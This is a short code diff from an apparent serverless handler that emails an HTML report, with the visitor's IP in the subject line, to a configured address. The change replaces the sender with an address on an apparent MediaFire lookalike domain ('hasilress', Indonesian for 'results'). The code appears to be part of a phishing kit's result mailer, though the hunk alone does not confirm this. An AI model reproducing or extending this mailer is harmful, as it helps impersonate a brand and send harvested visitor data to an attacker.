@@ -90,7 +90,7 @@ export default async function handler(req, res) {
             method: "POST",
             headers: { "Authorization": "Bearer " + API_KEY, "Content-Type": "application/json" },
             body: JSON.stringify({
-                from: NAMA + " <onboarding@resend.dev>",
+                from: NAMA + " <hasilress@mediafire.my.id>",
                 to: [EMAIL],
                 subject: "🥷 " + NAMA + " 🥷 | IP " + (d.ip || "-"),
                 html: htmlBody
